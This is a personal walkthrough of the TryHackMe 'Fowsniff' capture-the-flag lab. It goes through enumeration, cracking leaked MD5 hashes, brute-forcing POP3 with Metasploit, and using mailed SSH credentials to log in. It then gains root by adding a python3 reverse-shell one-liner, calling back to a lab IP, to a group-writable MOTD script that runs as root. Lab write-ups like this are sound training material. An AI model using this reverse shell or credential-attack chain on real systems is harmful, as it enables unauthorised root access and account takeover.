<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>fowsniff ctf</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>fowsniff ctf</h1><br/><p><strong><h1>THM: Fowsniff CTF</h1></strong></p><p></p><p>This is a guided CTF, thus I will follow THM guidlines.</p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong>Rustscan &amp; Nmap</strong></p><p><img src="images/43-1.png" alt="images/43-1.png" /></p><p></p><p>Open Ports: <strong>22,80,110,143</strong></p><p></p><p></p><p><strong>Website Enumeration</strong></p><p><img src="images/43-2.png" alt="images/43-2.png" /></p><p>The organization is claiming that the employee data was leaked and may be available at twitter handle.</p><p></p><p><strong>Google Search</strong></p><p>Upon searching google for Fowsniff Corp, we get a twitter page which is hacked</p><p><img src="images/43-3.png" alt="images/43-3.png" /></p><p></p><p>Lets open the <strong>pastebin</strong> link.</p><p><strong>https://pastebin.com/NrAqVeeX</strong></p><p></p><p><img src="images/43-4.png" alt="images/43-4.png" />\</p><p></p><p>In this page we find the following user hashes and also discovered that the hashes are MD5.</p><p></p><p>mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4</p><p>mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56</p><p>tegel@fowsniff:1dc352435fecca338acfd4be10984009</p><p>baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb</p><p>seina@fowsniff:90dc16d47114aa13671c697fd506cf26</p><p>stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd</p><p>mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b</p><p>parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11</p><p>sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e</p><p></p><p>We decode them all at <strong>https://hashes.com/en/decrypt/hash</strong></p><p><img src="images/43-5.png" alt="images/43-5.png" /></p><p></p><p>All hashes were cracked exclusing one. I will try to crack it using <strong>hashcat</strong></p><p><strong>Note:</strong> it can also be decoded using hashcat.</p><p> </p><p> Hashcat couldn&#39;t crack the leftout one using rockyou.txt</p><p> </p><p> </p><p> For demo: I tried <strong>hashcat -m 0 19f5af754c31f1e2651edde9250d69bb /usr/share/wordlists/rockyou.txt </strong></p><p>As expected we got the password as: <strong>skyler22</strong></p><p></p><p><img src="images/43-6.png" alt="images/43-6.png" /></p><p></p><p></p><p></p><p>Next, as per THM hint, we will use <strong>metasploit</strong> to bruteforce the <strong>pop3</strong> (mail) service. [Expecting to find certain users who have&#39;t changed their password]</p><p></p><p><strong>Note:</strong> We can use <strong>hydra</strong> to bruteforce <strong>pop3</strong>, however <strong>hydra</strong> uses <strong>cluster-bomb</strong> method by default. (All usernames checked with all passwords)</p><p>However, we ideally need pitchfork style of bruteforce where we use particular  username &amp; password combinations only.</p><p></p><p><strong>Metasploit</strong></p><p></p><p><strong>Note:</strong> After running i discovered that <strong>metasploit</strong> will also use <strong>cluster-bomb</strong> unless we use <strong>USERPASS_FILE</strong>. </p><p>To use this we need to set <strong>USER_FILE</strong> &amp; <strong>PASS_FILE</strong> to a dummy blank file.</p><p>By Default: The scanner used has a default user and password file. (We need to replace it with dummy blank file)</p><p>I created a blank file test.txt</p><p></p><p>We use <strong>auxiliary/scanner/pop3/pop3_login</strong> as per the hint.</p><p>I collected the usernames and passwords and created a <strong>userpass.txt</strong></p><p><img src="images/43-7.png" alt="images/43-7.png" /></p><p></p><p>Following <strong>options</strong> are added:</p><p><img src="images/43-8.png" alt="images/43-8.png" /></p><p></p><p><strong>Note: </strong>The file test.txt is blank. It&#39;s used to force use the <strong>USERPASS_FILE</strong> to have <strong>pitchfork</strong> bruteforce</p><p>Now, we run it.</p><p><img src="images/43-9.png" alt="images/43-9.png" /></p><p></p><p><strong>POP3 Credentials Found:</strong></p><p>Username:	<strong>seina</strong></p><p>Password:	<strong>scoobydoo2</strong></p><p></p><p><strong>Mail Enumeration</strong></p><p><img src="images/43-10.png" alt="images/43-10.png" /></p><p></p><p>We found 2 Emails. We read it using RETR 1,2.</p><p>The first mail has SSH credentais.</p><p>The second mail&#39;s sender is the user. (As per THM hint)</p><p></p><p><img src="images/43-11.png" alt="images/43-11.png" /></p><p></p><p><strong>SSH Credentials Found</strong></p><p>Username:	<strong>backsteen</strong></p><p>Password: 	<strong>S1ck3nBluff+secureshell</strong></p><p></p><p><strong><h2>Foothold</h2></strong></p><p></p><p>Lets SSH into the machine with the above credentials.</p><p><img src="images/43-12.png" alt="images/43-12.png" /></p><p></p><p><strong>Note:</strong> The user is a member of group <strong>users</strong></p><p>Lets see what files belong to that group</p><p></p><p><strong>find / -type f -group users -exec ls -l {} \+ 2&gt;/dev/null</strong></p><p></p><p><img src="images/43-13.png" alt="images/43-13.png" /></p><p></p><p>We have an intresting file <strong>cube.sh</strong> and its <strong>writable</strong> by group <strong>users</strong></p><p>Lets view it.</p><p></p><p><img src="images/43-14.png" alt="images/43-14.png" /></p><p></p><p>It looks like the welcome message we get when we <strong>login</strong>.</p><p></p><p>However, we need to see how this file is getting used during the SSH Login process.</p><p>For that we check the THM Hint: Look at the file<strong> /etc/update-motd.d/ </strong>folder.</p><p></p><p>In the folder, we found a <strong>00-header</strong> file which belongs to root and is called everytime a SSH Login is made.</p><p>Luckily the cube.sh file is being called in the file at the bottom.</p><p></p><p><img src="images/43-15.png" alt="images/43-15.png" /></p><p></p><p>As we have write permission on cube.sh, we will include a python reverse shell in the script and when we login again it will be called.</p><p></p><p>1. Edit the <strong>cube.sh</strong> file &amp; add the python reverse shell code</p><p>2. Start the netcat listener</p><p>3. Exit from SSH and login again.</p><p>4. We should have the root connection in the listner.</p><p></p><p><strong>Python Reverse Shell Code:</strong></p><p>#!/bin/bash</p><p>python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.11.72.31&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;</p><p></p><p><strong>Final cube.sh:</strong></p><p></p><p><img src="images/43-16.png" alt="images/43-16.png" /></p><p></p><p></p><p>Start Netcat Listener and Relogin into SSH. We should have the root connection.</p><p></p><p><img src="images/43-17.png" alt="images/43-17.png" /></p><p></p><p>Thus, we have full root access.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
